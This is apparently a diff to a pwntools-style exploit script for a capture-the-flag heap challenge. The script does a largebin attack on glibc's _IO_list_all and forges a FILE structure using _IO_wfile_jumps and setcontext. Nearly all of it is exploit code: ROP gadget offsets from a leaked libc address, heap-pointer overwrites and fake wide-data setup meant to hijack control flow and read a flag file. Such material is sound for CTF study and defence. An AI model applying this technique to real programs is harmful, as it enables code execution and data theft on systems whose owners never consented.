@@ -83,7 +83,6 @@ pop_rdx_rbx=leak_addr+0x8bbb9
 pop_rax=leak_addr+0x3f923
 ret=leak_addr+0x22d19
 _IO_list_all=leak_addr+libc.sym[b"_IO_list_all"]
-_IO_list_all_chain=_IO_list_all+0x88
 _IO_wfile_jumps=leak_addr+libc.sym[b"_IO_wfile_jumps"]
 setcontext_61=leak_addr+libc.sym[b"setcontext"]+0x3d
 open_a=leak_addr+libc.sym[b"open"]
@@ -108,7 +107,7 @@ print("heap_addr: "+hex(heap_addr))
 
 ### largebin attack
 delete(3)
-edit(1,p64(tmp)*2+p64(0)+p64(_IO_list_all_chain-0x20))
+edit(1,p64(tmp)*2+p64(0)+p64(_IO_list_all-0x20))
 add(6,0x900)
 ###
 add(7,0x540) #将小堆块申请出来，进行unlink，使得_IO_list_all_chain的地址是可控的大堆块的地址，否则伪造fake_file地址非法
@@ -125,13 +124,13 @@ add(7,0x540) #将小堆块申请出来，进行unlink，使得_IO_list_all_chain
 
 
 #edit _flags ~(2 | 0x8 | 0x800)
-edit(0,b"\x00"*0x600+p64((~(2 | 0x8 | 0x800))&0xffffffffffffffff))
+# edit(0,b"\x00"*0x600+p64((~(2 | 0x8 | 0x800))&0xffffffffffffffff))
 
 #fake_wide_data
 fake_wide_data=heap_addr+0x2a0
 flag_addr=heap_addr+0x2a0
 
-edit(1,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,magic_gadget))
+edit(1,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,0))
 fake_jump=heap_addr+0x1f70
 
 
